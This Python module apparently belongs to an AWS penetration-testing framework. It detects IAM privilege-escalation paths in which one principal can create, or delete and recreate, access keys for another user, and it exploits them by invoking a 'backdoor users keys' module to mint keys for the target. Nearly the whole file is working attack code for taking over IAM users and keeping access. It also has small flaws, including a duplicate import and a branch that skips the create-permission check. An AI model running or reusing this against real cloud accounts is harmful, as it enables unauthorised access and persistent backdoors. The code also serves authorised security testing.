from typing import Optional

from modules.iam__pivot_v2.common import Escalation
from . import IamEscalationChecker

from principalmapper.querying.query_interface import local_check_authorization_handling_mfa as local_check_auth_mfa, \
    Node
from .iam_checker import IamEscalationChecker


def ChangeUserAccessKeys(pacu_main, print, input, fetch_data, target: Node, source: Node):
    print("Automatically running this escalation isn't currently supported")
    return False


def CreateUserAccessKey(pacu_main, print, input, fetch_data, target: Node, source: Node):
    print('  Starting method CreateAccessKey...\n')
    username = target.arn.split('/')[-1]

    # Use the iam__backdoor_users_keys module to do the access key creating
    try:
        fetch_data(None, 'iam__backdoor_users_keys', '--usernames {}'.format(username), force=True)
    except Exception as e:
        print('      Failed to create an access key for user {}: {}'.format(username, e))
        return False
    return True


@IamEscalationChecker.register_user_escalation
def change_user_access_keys(source: Node, dest: Node) -> Optional[Escalation]:
    # Change the user's access keys
    create_auth_res, access_keys_mfa = local_check_auth_mfa(source, 'iam:CreateAccessKey', dest.arn, {})

    if dest.access_keys == 2:
        # can have a max of two access keys, need to delete before making a new one
        auth_res, mfa_res = local_check_auth_mfa(source, 'iam:DeleteAccessKey', dest.arn, {})
        if not auth_res:
            return None  # can't delete target access key, can't generate a new one
        if mfa_res:
            access_keys_mfa = True

        reason = 'can change access keys to authenticate as'
        if access_keys_mfa:
            reason = '(MFA required) ' + reason

        return Escalation(source, dest, escalate_func=CreateUserAccessKey, reason=reason)
    elif create_auth_res:
        reason = 'can create access keys to authenticate as'
        if access_keys_mfa:
            reason = '(MFA required) ' + reason

        return Escalation(source, dest, escalate_func=CreateUserAccessKey, reason=reason)
    else:
        return None
